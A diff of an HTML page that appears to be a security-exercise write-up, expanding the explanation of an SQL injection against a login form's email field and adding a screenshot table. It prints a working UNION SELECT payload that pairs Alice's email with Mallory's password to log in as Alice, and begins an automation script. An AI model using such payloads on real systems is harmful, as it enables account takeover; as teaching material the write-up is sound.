@@ -78,7 +78,7 @@
 	}
 </script>
 <!--
-	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+	<p><a href="http://:4000">TOP</a></p>
 
 	
 	
@@ -186,6 +186,19 @@
 <p>Additionally, the backend doesn’t check whether the string sent in the email field is in fact a proper email.
 We can use this to our advantage to manipulate the table and log in as Alice without knowing her password.</p>
 
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/images/incmed1.png" alt="main page" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>The email field when signing in on the main page</em></td>
+    </tr>
+  </tbody>
+</table>
+
 <p><br /></p>
 
 <hr />
@@ -194,9 +207,28 @@ We can use this to our advantage to manipulate the table and log in as Alice wit
 
 <hr />
 
-<p>In the exploit, notice that the email field is set to be an SQL query so when the server
-tries to fetch the corresponding user, it also does the “injected” operations. Here,
-we take advantage of that to log in as Alice and make a post under her user.</p>
+<p>In the exploit, we set the email field to be an SQL query so when the server
+tries to fetch the corresponding user, it also performs the “injected” operations.</p>
+
+<p>In order to log in as Alice, we use string literals which correspond to her email and
+username while selecting the password which correspond to mallory’s email.</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="s1">'alice@example.com'</span><span class="p">,</span><span class="s1">'Alice'</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">email</span> <span class="o">=</span> <span class="s1">'mallory@example.com'</span><span class="nv">"
+</span></code></pre></div></div>
+
+<p>however, since the server-side uses single quotes and already has a <code class="language-plaintext highlighter-rouge">SELECT</code> operation
+we need to get it to ignore the first part and return only the injected code.
+This can by done by <code class="language-plaintext highlighter-rouge">UNION</code> with something we know should return an empty table, for instance</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">email</span> <span class="o">=</span> <span class="s1">'0'</span>
+</code></pre></div></div>
+
+<p>playing around the single quotes and using <code class="language-plaintext highlighter-rouge">UNION</code> our final query looks as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"0' UNION SELECT 'alice@example.com','Alice', password FROM users where email = 'mallory@example.com",
+</code></pre></div></div>
+
+<p>Finally, we can automate the process using the requests library similar to past exercises:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">requests</span>
 <span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlencode</span>
